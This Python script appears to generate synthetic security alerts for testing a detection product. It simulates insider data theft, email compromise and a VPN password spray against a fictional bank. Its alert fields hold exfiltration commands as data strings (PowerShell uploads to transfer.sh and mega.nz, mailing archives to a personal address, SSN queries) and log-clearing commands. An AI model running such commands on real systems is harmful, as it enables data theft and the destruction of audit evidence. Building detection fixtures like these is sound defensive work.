"""Generate sim2_financial_fraud.json for Vigilis simulation testing."""
import json
import os
import random
from datetime import datetime, timedelta

random.seed(42)

alerts = []

def ts(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")

def make_alert(event_type, user, ip, severity, description, event_time,
               geo=None, device=None, process=None, file_path=None,
               email_from=None, email_to=None, email_subject=None,
               dest_ip=None, source_system="GlobalBank-SIEM"):
    alert = {
        "metadata": {
            "event_type": event_type,
            "product_event_type": event_type,
            "description": description,
            "vendor_name": "GlobalBank Security",
            "product_name": source_system,
            "log_type": "SECURITY"
        },
        "principal": {
            "user": {
                "userid": user,
                "email_addresses": [user]
            },
            "ip": [ip] if ip else [],
            "location": {
                "country_or_region": geo or "US"
            }
        },
        "target": {},
        "securityResult": {
            "severity": severity,
            "summary": description
        },
        "event_time": ts(event_time)
    }
    if device:
        alert["principal"]["hostname"] = device
    if process:
        alert["target"]["process"] = {"command_line": process, "file": {"full_path": process.split()[0]}}
    if file_path:
        alert["target"]["file"] = {"full_path": file_path}
    if dest_ip:
        alert["target"]["ip"] = [dest_ip]
    if email_from:
        alert["network"] = {"email": {}}
        if email_from:
            alert["network"]["email"]["mailfrom"] = email_from
        if email_to:
            alert["network"]["email"]["to"] = [email_to]
        if email_subject:
            alert["network"]["email"]["subject"] = email_subject
    return alert

# ============================================================
# BASE TIMES
# ============================================================
day1 = datetime(2026, 4, 8, 0, 0, 0)   # April 8
day2 = datetime(2026, 4, 9, 0, 0, 0)   # April 9
day3 = datetime(2026, 4, 10, 0, 0, 0)  # April 10

# ============================================================
# ATTACK 1: INSIDER THREAT — marcus.webb@globalbank.com (80 alerts)
# Spread across April 8-10, mostly after hours (11pm-3am)
# ============================================================
marcus = "marcus.webb@globalbank.com"
marcus_ip = "10.1.50.77"
marcus_device = "WKSTN-MARCUS-01"

# Night 1: April 8, 23:00 - April 9, 03:00 (reconnaissance + initial access)
base = day1 + timedelta(hours=23)

# suspicious_signin: 10 alerts across 3 nights
for i in range(4):
    t = base + timedelta(minutes=random.randint(0, 60))
    alerts.append(make_alert("suspicious_signin", marcus, marcus_ip, "HIGH",
        f"After-hours login by marcus.webb from workstation at {ts(t)}",
        t, geo="US", device=marcus_device))

for i in range(3):
    t = day2 + timedelta(hours=23, minutes=random.randint(0, 120))
    alerts.append(make_alert("suspicious_signin", marcus, marcus_ip, "HIGH",
        f"After-hours login by marcus.webb - repeated pattern night 2",
        t, geo="US", device=marcus_device))

for i in range(3):
    t = day3 + timedelta(hours=1, minutes=random.randint(0, 120))
    alerts.append(make_alert("suspicious_signin", marcus, marcus_ip, "HIGH",
        f"After-hours login by marcus.webb - third consecutive night",
        t, geo="US", device=marcus_device))

# anomalous_api_call: 15 alerts — accessing restricted trading APIs
restricted_apis = [
    "/api/v2/trading/portfolio/export",
    "/api/v2/clients/pii/bulk-download",
    "/api/v2/risk-mgmt/positions/all",
    "/api/v2/compliance/audit-trail",
    "/api/v2/trading/algo/config",
    "/api/internal/client-data/search",
    "/api/v2/settlements/pending",
    "/api/internal/margin-accounts",
]
for i in range(15):
    night = random.choice([0, 1, 2])
    base_t = [day1 + timedelta(hours=23, minutes=30),
              day2 + timedelta(hours=23, minutes=30),
              day3 + timedelta(hours=1, minutes=30)][night]
    t = base_t + timedelta(minutes=random.randint(0, 90))
    api = random.choice(restricted_apis)
    alerts.append(make_alert("anomalous_api_call", marcus, marcus_ip, "HIGH",
        f"Anomalous API call to restricted endpoint {api} by marcus.webb after hours",
        t, geo="US", device=marcus_device))

# large_data_transfer: 10 alerts — USB/cloud downloads
cloud_targets = [
    "personal-dropbox://marcus.webb/exports/",
    "usb://SANDISK-128GB/client-data/",
    "gdrive://marcus.personal/trading-data/",
    "mega.nz://upload/encrypted/",
    "usb://KINGSTON-64GB/portfolios/",
]
for i in range(10):
    night = random.choice([0, 1, 2])
    base_t = [day1 + timedelta(hours=23, minutes=45),
              day2 + timedelta(hours=23, minutes=45),
              day3 + timedelta(hours=2)][night]
    t = base_t + timedelta(minutes=random.randint(0, 60))
    size_mb = random.randint(100, 950)
    target = random.choice(cloud_targets)
    alerts.append(make_alert("large_data_transfer", marcus, marcus_ip, "CRITICAL",
        f"Large data transfer {size_mb}MB to {target} by marcus.webb",
        t, geo="US", device=marcus_device,
        file_path=f"C:\\Users\\marcus.webb\\exports\\client_portfolio_batch_{i}.7z"))

# privilege_escalation: 5 alerts — admin console access attempts
for i in range(5):
    night = random.choice([1, 2])
    base_t = [None, day2 + timedelta(hours=23, minutes=50),
              day3 + timedelta(hours=1, minutes=50)][night]
    t = base_t + timedelta(minutes=random.randint(0, 30))
    alerts.append(make_alert("privilege_escalation", marcus, marcus_ip, "CRITICAL",
        f"Privilege escalation attempt: marcus.webb tried to access admin console /admin/user-mgmt",
        t, geo="US", device=marcus_device))

# process_execution: 10 alerts — data scraping scripts, SQL queries
procs = [
    "python.exe data_scraper.py --target client_db --output export.csv",
    "sqlcmd.exe -S PROD-SQL-01 -Q \"SELECT * FROM clients WHERE portfolio_value > 1000000\"",
    "python.exe extract_trades.py --date-range 2026-01-01:2026-04-08",
    "bcp.exe clients.dbo.portfolio_holdings out holdings.csv -S PROD-SQL-01 -T",
    "sqlcmd.exe -S PROD-SQL-01 -Q \"SELECT ssn, account_no FROM clients.dbo.pii\"",
    "python.exe bulk_export.py --all-accounts --format json",
    "curl.exe -o client_list.json https://internal-api.globalbank.com/api/v2/clients/all",
    "7z.exe a -pS3cr3tP@ss encrypted_export.7z exports/",
    "robocopy.exe \\\\fileserver\\trading-data C:\\Users\\marcus.webb\\staging /E",
    "python.exe parse_settlement_data.py --since 2025-01-01",
]
for i, proc in enumerate(procs):
    night = i % 3
    base_t = [day1 + timedelta(hours=23, minutes=20),
              day2 + timedelta(hours=23, minutes=20),
              day3 + timedelta(hours=1, minutes=20)][night]
    t = base_t + timedelta(minutes=random.randint(0, 90))
    alerts.append(make_alert("process_execution", marcus, marcus_ip, "HIGH",
        f"Suspicious process execution by marcus.webb: {proc.split()[0]}",
        t, geo="US", device=marcus_device, process=proc))

# suspicious_process: 10 alerts — PowerShell, encrypted archives
ps_commands = [
    "powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AC...",
    "powershell.exe -ep bypass -c \"Compress-Archive -Path C:\\exports -DestinationPath C:\\temp\\data.zip\"",
    "powershell.exe -c \"Get-ADUser -Filter * -Properties * | Export-CSV users.csv\"",
    "cmd.exe /c \"certutil -encode payload.bin payload.b64\"",
    "powershell.exe -c \"[System.Net.WebClient]::new().UploadFile('https://transfer.sh','data.7z')\"",
    "powershell.exe -c \"Get-ChildItem \\\\fileserver\\finance -Recurse | Copy-Item -Destination C:\\staging\"",
    "cmd.exe /c \"rar.exe a -hp encrypted.rar C:\\exports\\*\"",
    "powershell.exe -c \"Invoke-WebRequest -Uri https://api.mega.nz/upload -Method POST -InFile data.7z\"",
    "cmd.exe /c \"openssl enc -aes-256-cbc -in client_data.csv -out client_data.enc\"",
    "powershell.exe -ep bypass -c \"Send-MailMessage -To marcus.personal@gmail.com -Attachments data.zip\"",
]
for i, cmd in enumerate(ps_commands):
    night = i % 3
    base_t = [day1 + timedelta(hours=23, minutes=40),
              day2 + timedelta(hours=23, minutes=40),
              day3 + timedelta(hours=2, minutes=10)][night]
    t = base_t + timedelta(minutes=random.randint(0, 60))
    alerts.append(make_alert("suspicious_process", marcus, marcus_ip, "HIGH",
        f"Suspicious process on {marcus_device}: {cmd[:60]}...",
        t, geo="US", device=marcus_device, process=cmd))

# CreateAccessKey: 5 alerts — creating API keys for external access
for i in range(5):
    night = random.choice([1, 2])
    base_t = [None, day2 + timedelta(hours=23, minutes=55),
              day3 + timedelta(hours=2, minutes=30)][night]
    t = base_t + timedelta(minutes=random.randint(0, 20))
    alerts.append(make_alert("createaccesskey", marcus, marcus_ip, "CRITICAL",
        f"marcus.webb created new API access key for external service integration #{i+1}",
        t, geo="US", device=marcus_device))

# ============================================================
# ATTACK 2: BEC — sarah.chen@globalbank.com (60 alerts)
# Concentrated April 10, 09:00-11:00 UTC
# ============================================================
sarah = "sarah.chen@globalbank.com"
sarah_normal_ip = "10.1.10.22"
attacker_ip = "203.0.113.55"

# Noise: normal login_success from sarah's regular IP (10 alerts, LOW)
for i in range(10):
    day = random.choice([day1, day2, day3])
    t = day + timedelta(hours=random.randint(8, 17), minutes=random.randint(0, 59))
    alerts.append(make_alert("login_success", sarah, sarah_normal_ip, "LOW",
        f"Normal login by sarah.chen from corporate network",
        t, geo="US", device="WKSTN-SCHEN-01"))

# phishing_detected: 5 alerts — spear-phishing emails targeting CFO
phishing_subjects = [
    "RE: Q1 Board Presentation - Updated Financial Summary",
    "Urgent: Wire Transfer Approval Required - Merger Escrow",
    "ACTION REQUIRED: Updated Banking Details for Vendor Payment",
    "FW: Confidential - CEO Compensation Review Package",
    "RE: Emergency Fund Transfer - Legal Settlement",
]
for i, subj in enumerate(phishing_subjects):
    t = day3 + timedelta(hours=8, minutes=30 + i * 5)
    alerts.append(make_alert("phishing_detected", sarah, attacker_ip, "CRITICAL",
        f"Spear-phishing email detected targeting CFO sarah.chen",
        t, geo="SG",
        email_from=f"ceo-office@g1obalbank.com",  # typosquat
        email_to=sarah,
        email_subject=subj))

# suspicious_signin: 8 alerts — login from unusual location (Singapore)
for i in range(8):
    t = day3 + timedelta(hours=9, minutes=random.randint(0, 30))
    alerts.append(make_alert("suspicious_signin", sarah, attacker_ip, "HIGH",
        f"Suspicious sign-in for sarah.chen from unusual location Singapore (IP: {attacker_ip})",
        t, geo="SG"))

# login_success: 5 alerts — successful auth after phishing
for i in range(5):
    t = day3 + timedelta(hours=9, minutes=15 + random.randint(0, 20))
    alerts.append(make_alert("login_success", sarah, attacker_ip, "MEDIUM",
        f"Successful authentication for sarah.chen from Singapore IP after phishing campaign",
        t, geo="SG"))

# email_forwarding_rule: 5 alerts — forwarding finance emails to external
external_addrs = [
    "finance-reports@protonmail.com",
    "gb-finance@tutanota.com",
    "sarah.chen.backup@gmail.com",
    "wire-approvals@protonmail.com",
    "cfo-backup@tutanota.com",
]
for i, addr in enumerate(external_addrs):
    t = day3 + timedelta(hours=9, minutes=30 + i * 3)
    alerts.append(make_alert("email_forwarding_rule", sarah, attacker_ip, "CRITICAL",
        f"Email forwarding rule created: finance@globalbank.com -> {addr}",
        t, geo="SG",
        email_from="finance@globalbank.com",
        email_to=addr))

# anomalous_api_call: 5 alerts — accessing wire transfer approval API
wire_apis = [
    "/api/v2/treasury/wire-transfer/approve",
    "/api/v2/treasury/wire-transfer/initiate",
    "/api/v2/treasury/beneficiary/add",
    "/api/internal/payment-gateway/override",
    "/api/v2/treasury/wire-transfer/batch-approve",
]
for i, api in enumerate(wire_apis):
    t = day3 + timedelta(hours=10, minutes=i * 5)
    alerts.append(make_alert("anomalous_api_call", sarah, attacker_ip, "CRITICAL",
        f"Anomalous API call to wire transfer endpoint {api} from compromised CFO account",
        t, geo="SG"))

# privilege_escalation: 3 alerts — CFO-level approvals
for i in range(3):
    t = day3 + timedelta(hours=10, minutes=20 + i * 5)
    alerts.append(make_alert("privilege_escalation", sarah, attacker_ip, "CRITICAL",
        f"Privilege escalation: sarah.chen account used to approve wire transfer #{i+1} ($2.5M to offshore account)",
        t, geo="SG"))

# Additional BEC indicators
for i in range(9):
    t = day3 + timedelta(hours=9, minutes=40 + i * 3)
    alerts.append(make_alert("suspicious_signin", sarah, attacker_ip, "HIGH",
        f"Continued suspicious access from compromised CFO account, session #{i+1}",
        t, geo="SG"))


# ============================================================
# ATTACK 3: VPN PASSWORD SPRAY (60 alerts)
# April 10, 02:00-02:30 UTC (30-minute burst)
# ============================================================
spray_ip = "94.142.241.18"
spray_users = [
    "john.doe@globalbank.com",
    "jane.smith@globalbank.com",
    "mike.brown@globalbank.com",
    "lisa.johnson@globalbank.com",
    "david.williams@globalbank.com",
    "emily.davis@globalbank.com",
    "robert.miller@globalbank.com",
    "jennifer.wilson@globalbank.com",
    "william.moore@globalbank.com",
    "amanda.taylor@globalbank.com",
    "james.anderson@globalbank.com",
    "jessica.thomas@globalbank.com",
    "daniel.jackson@globalbank.com",
    "ashley.white@globalbank.com",
    "christopher.harris@globalbank.com",
]
common_passwords = [
    "Summer2026!", "Welcome123", "Password1!", "GlobalBank2026",
    "Changeme1!", "P@ssw0rd", "Company123!",
]

# login_failure: 50 alerts — spray across 15 users
for i in range(50):
    user = spray_users[i % len(spray_users)]
    t = day3 + timedelta(hours=2, minutes=random.randint(0, 29), seconds=random.randint(0, 59))
    pwd = random.choice(common_passwords)
    alerts.append(make_alert("login_failure", user, spray_ip, "MEDIUM",
        f"Failed VPN authentication for {user.split('@')[0]} from {spray_ip} (password spray pattern detected)",
        t, geo="RU", device="VPN-GW-01"))

# suspicious_signin: 10 alerts — same IP after spray succeeds on 2 accounts
compromised = ["lisa.johnson@globalbank.com", "william.moore@globalbank.com"]
for i in range(10):
    user = compromised[i % 2]
    t = day3 + timedelta(hours=2, minutes=30 + random.randint(0, 15))
    alerts.append(make_alert("suspicious_signin", user, spray_ip, "HIGH",
        f"Suspicious sign-in after password spray: {user.split('@')[0]} from {spray_ip} (RU)",
        t, geo="RU", device="VPN-GW-01"))


# ============================================================
# ATTACK 1 EXTRA: More marcus.webb alerts to reach 80 total
# ============================================================

# Additional anomalous_api_call: 5 more (now 20 total)
extra_apis = [
    "/api/internal/compliance/override-check",
    "/api/v2/trading/dark-pool/orders",
    "/api/v2/clients/high-net-worth/list",
    "/api/internal/risk-models/parameters",
    "/api/v2/settlements/force-release",
]
for i, api in enumerate(extra_apis):
    night = i % 3
    base_t = [day1 + timedelta(hours=23, minutes=10),
              day2 + timedelta(hours=23, minutes=10),
              day3 + timedelta(hours=1, minutes=10)][night]
    t = base_t + timedelta(minutes=random.randint(0, 90))
    alerts.append(make_alert("anomalous_api_call", marcus, marcus_ip, "HIGH",
        f"Anomalous API access to restricted endpoint {api} by marcus.webb",
        t, geo="US", device=marcus_device))

# Additional large_data_transfer: 5 more (now 15 total)
for i in range(5):
    night = i % 3
    base_t = [day1 + timedelta(hours=23, minutes=50),
              day2 + timedelta(hours=23, minutes=50),
              day3 + timedelta(hours=2, minutes=15)][night]
    t = base_t + timedelta(minutes=random.randint(0, 45))
    size_mb = random.randint(200, 800)
    alerts.append(make_alert("large_data_transfer", marcus, marcus_ip, "CRITICAL",
        f"Large data exfiltration {size_mb}MB to external cloud storage by marcus.webb",
        t, geo="US", device=marcus_device,
        file_path=f"C:\\Users\\marcus.webb\\staging\\trade_history_{i}.encrypted"))

# Additional suspicious_process: 5 more (now 15 total)
extra_ps = [
    "powershell.exe -c \"Get-EventLog -LogName Security -Newest 1000 | Export-CSV audit_logs.csv\"",
    "net.exe use \\\\PROD-NAS-02\\finance /user:marcus.webb",
    "powershell.exe -c \"Remove-Item -Path C:\\Users\\marcus.webb\\AppData\\Local\\Temp\\* -Recurse\"",
    "cmd.exe /c \"wevtutil cl Security\"",
    "powershell.exe -c \"Clear-RecycleBin -Force -ErrorAction SilentlyContinue\"",
]
for i, cmd in enumerate(extra_ps):
    night = i % 3
    base_t = [day1 + timedelta(hours=23, minutes=55),
              day2 + timedelta(hours=23, minutes=55),
              day3 + timedelta(hours=2, minutes=40)][night]
    t = base_t + timedelta(minutes=random.randint(0, 30))
    alerts.append(make_alert("suspicious_process", marcus, marcus_ip, "HIGH",
        f"Suspicious anti-forensic activity on {marcus_device}: {cmd[:50]}...",
        t, geo="US", device=marcus_device, process=cmd))

# ============================================================
# ATTACK 2 EXTRA: More BEC alerts to reach ~60 total
# ============================================================

# Additional suspicious_signin from attacker IP: 5 more
for i in range(5):
    t = day3 + timedelta(hours=10, minutes=30 + random.randint(0, 20))
    alerts.append(make_alert("suspicious_signin", sarah, attacker_ip, "HIGH",
        f"Persistent unauthorized access to CFO account from Singapore",
        t, geo="SG"))

# Additional anomalous_api_call for wire transfers: 5 more
extra_wire_apis = [
    "/api/v2/treasury/fx-conversion/large",
    "/api/v2/accounts-payable/invoice/override",
    "/api/v2/treasury/swift-message/create",
    "/api/internal/compliance/aml-override",
    "/api/v2/treasury/correspondent-bank/add",
]
for i, api in enumerate(extra_wire_apis):
    t = day3 + timedelta(hours=10, minutes=35 + i * 3)
    alerts.append(make_alert("anomalous_api_call", sarah, attacker_ip, "CRITICAL",
        f"Anomalous financial API access from compromised CFO account: {api}",
        t, geo="SG"))

# ============================================================
# NOISE — 50 alerts (should be low confidence, NOT in incidents)
# ============================================================

# benign_process from svc-monitoring, svc-backup: 20 alerts
svc_accounts = ["svc-monitoring@globalbank.com", "svc-backup@globalbank.com"]
svc_procs = [
    "nagios_check.sh --host db-prod-01",
    "zabbix_agent -c /etc/zabbix/zabbix_agentd.conf",
    "backup_rotation.sh --daily --retain 30",
    "rsync -avz /data/backups/ backup-server:/archive/",
    "prometheus_collector --target prod-cluster",
]
for i in range(20):
    svc = svc_accounts[i % 2]
    day = [day1, day2, day3][i % 3]
    t = day + timedelta(hours=random.randint(0, 23), minutes=random.randint(0, 59))
    proc = random.choice(svc_procs)
    alerts.append(make_alert("benign_process", svc, "10.1.1.1", "LOW",
        f"Scheduled service process: {proc.split()[0]}",
        t, geo="US", device="SRV-MONITORING-01", process=proc))

# service_restart from infra accounts: 10 alerts
infra_accounts = ["svc-deploy@globalbank.com", "svc-infra@globalbank.com", "svc-platform@globalbank.com"]
services = ["nginx", "redis-cluster", "kafka-broker", "elasticsearch", "consul-agent",
            "vault-server", "prometheus", "grafana", "postgres-replica", "haproxy"]
for i in range(10):
    svc = infra_accounts[i % 3]
    day = [day1, day2, day3][i % 3]
    t = day + timedelta(hours=random.randint(2, 6), minutes=random.randint(0, 59))
    service = services[i]
    alerts.append(make_alert("service_restart", svc, "10.1.1.5", "LOW",
        f"Service restart: {service} restarted by {svc.split('@')[0]} during maintenance window",
        t, geo="US", device=f"SRV-{service.upper()}-01"))

# login_success from normal users at normal times: 20 alerts
normal_users = [
    "alice.zhang@globalbank.com", "bob.patel@globalbank.com",
    "carol.nguyen@globalbank.com", "derek.jones@globalbank.com",
    "fiona.garcia@globalbank.com", "george.kim@globalbank.com",
    "hannah.lee@globalbank.com", "ian.clark@globalbank.com",
    "julia.martinez@globalbank.com", "kevin.wright@globalbank.com",
]
for i in range(20):
    user = normal_users[i % len(normal_users)]
    day = [day1, day2, day3][i % 3]
    t = day + timedelta(hours=random.randint(8, 17), minutes=random.randint(0, 59))
    alerts.append(make_alert("login_success", user, f"10.1.{random.randint(10, 50)}.{random.randint(10, 250)}", "LOW",
        f"Normal business-hours login by {user.split('@')[0]}",
        t, geo="US", device=f"WKSTN-{user.split('.')[0].upper()}-01"))


# ============================================================
# SORT AND WRITE
# ============================================================
alerts.sort(key=lambda a: a["event_time"])

print(f"Total alerts generated: {len(alerts)}")

# Count by category
marcus_count = sum(1 for a in alerts if a["principal"]["user"]["userid"] == marcus)
sarah_count = sum(1 for a in alerts if a["principal"]["user"]["userid"] == sarah)
spray_count = sum(1 for a in alerts if a["principal"]["user"]["userid"] in spray_users + compromised)
noise_svc = sum(1 for a in alerts if "svc-" in a["principal"]["user"]["userid"])
noise_normal = sum(1 for a in alerts if a["principal"]["user"]["userid"] in normal_users)
sarah_normal = sum(1 for a in alerts if a["principal"]["user"]["userid"] == sarah
                   and a["principal"]["ip"] == [sarah_normal_ip])

print(f"  Marcus insider threat: {marcus_count}")
print(f"  Sarah BEC (attacker): {sarah_count - sarah_normal}")
print(f"  Sarah BEC (normal noise): {sarah_normal}")
print(f"  VPN spray: {spray_count}")
print(f"  Noise (svc): {noise_svc}")
print(f"  Noise (normal users): {noise_normal}")

_out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sim2_financial_fraud.json")
with open(_out, "w") as f:
    json.dump(alerts, f, indent=2)

print(f"Written to {_out}")
